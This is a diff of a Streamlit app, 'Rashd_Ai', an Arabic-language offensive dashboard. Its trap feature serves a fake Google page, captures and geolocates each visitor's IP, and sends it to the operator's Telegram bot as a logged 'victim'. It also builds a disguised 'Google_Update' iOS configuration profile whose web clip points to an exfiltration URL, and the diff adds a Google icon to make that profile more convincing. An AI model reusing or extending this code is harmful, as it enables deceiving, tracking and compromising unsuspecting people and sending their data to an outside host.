@@ -30,7 +30,6 @@ hide_st_style = """
 # دالة جلب الـ IP العام من السيرفر (كاحتياط)
 def get_server_side_ip():
     try:
-        # محاولة جلب الـ IP من ترويسات Streamlit
         headers = st.context.headers
         if "X-Forwarded-For" in headers:
             return headers["X-Forwarded-For"].split(",")[0].strip()
@@ -46,7 +45,6 @@ def send_telegram_alert(ip, trap_name, device="Unknown"):
     if not token or not chat_id:
         return
         
-    # جلب البيانات الجغرافية
     geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
     try:
         res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
@@ -73,7 +71,6 @@ def send_telegram_alert(ip, trap_name, device="Unknown"):
     
     try:
         requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": message})
-        # تسجيل الضحية في الملف المحلي
         victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
     except:
         pass
@@ -82,17 +79,13 @@ def send_telegram_alert(ip, trap_name, device="Unknown"):
 query_params = st.query_params
 if "decoy" in query_params:
     st.markdown(hide_st_style, unsafe_allow_html=True)
-    
-    # جلب الـ IP من الرابط إذا تم إرساله بواسطة JS، أو من السيرفر
     client_ip = query_params.get("ip", get_server_side_ip())
     trap_name = query_params.get("trap", "Google Decoy")
     
-    # إرسال التنبيه فوراً إذا لم يتم إرساله مسبقاً في هذه الجلسة
     if "alert_sent" not in st.session_state:
         send_telegram_alert(client_ip, trap_name)
         st.session_state.alert_sent = True
 
-    # عرض صفحة Google الوهمية
     with open("index.html", "r", encoding="utf-8") as f:
         html_content = f.read()
     st.components.v1.html(html_content, height=1000, scrolling=False)
@@ -109,7 +102,6 @@ if "download" in query_params:
         content = b"Fake APK Content"
     elif device == "ios":
         file_name = "Google_Update.mobileconfig"
-        # إنشاء ملف تعريف آيفون حقيقي تقنياً
         content = f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -135,6 +127,8 @@ if "download" in query_params:
             <string>https://rashdai.streamlit.app/?exfiltrate=true&amp;id={uuid.uuid4()}</string>
             <key>IsRemovable</key>
             <true/>
+            <key>Icon</key>
+            <data>{base64.b64encode(open('google_icon.png', 'rb').read()).decode() if os.path.exists('google_icon.png') else ''}</data>
         </dict>
     </array>
     <key>PayloadDisplayName</key>
@@ -162,7 +156,6 @@ if "download" in query_params:
 # --- الواجهة الرئيسية للمطور ---
 st.title("🛡️ لوحة تحكم Rashd_Ai")
 
-# نظام تسجيل الدخول البسيط
 if "authenticated" not in st.session_state:
     st.session_state.authenticated = False
 
@@ -178,7 +171,6 @@ if not st.session_state.authenticated:
                 st.error("بيانات خاطئة")
     st.stop()
 
-# الشريط الجانبي
 with st.sidebar:
     st.header("⚙️ الإعدادات")
     telegram_bot_token = st.text_input("Telegram Bot Token", value=config.get_key("TELEGRAM_BOT_TOKEN"), type="password")
@@ -189,21 +181,21 @@ with st.sidebar:
         st.success("تم الحفظ بنجاح!")
 
 # التبويبات الـ 18 المطلوبة
-tabs = st.tabs([
+tab_names = [
     "💬 المحادثة", "🌐 الدومين", "🔍 المواقع", "👤 المستخدم", "📍 الموقع", 
     "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 جوجل دورك", 
     "📧 التسريبات", "📱 الهاتف", "🌑 الدارك ويب", "🔌 المنافذ", 
     "⚠️ الثغرات", "🗺️ الشبكة", "🚨 التهديدات", "💡 الخطة", "📄 التقارير",
     "🎯 المصيدة"
-])
+]
+tabs = st.tabs(tab_names)
 
-# محتوى التبويبات (تبسيط للعرض)
 for i, tab in enumerate(tabs[:-1]):
     with tab:
-        st.info(f"أداة {tab.label} جاهزة للعمل.")
-        st.button(f"بدء {tab.label}", key=f"btn_{i}")
+        name = tab_names[i]
+        st.info(f"أداة {name} جاهزة للعمل.")
+        st.button(f"بدء {name}", key=f"btn_{i}")
 
-# تبويب المصيدة (Trap)
 with tabs[-1]:
     st.header("🎯 نظام المصيدة المتقدم")
     col1, col2 = st.columns(2)
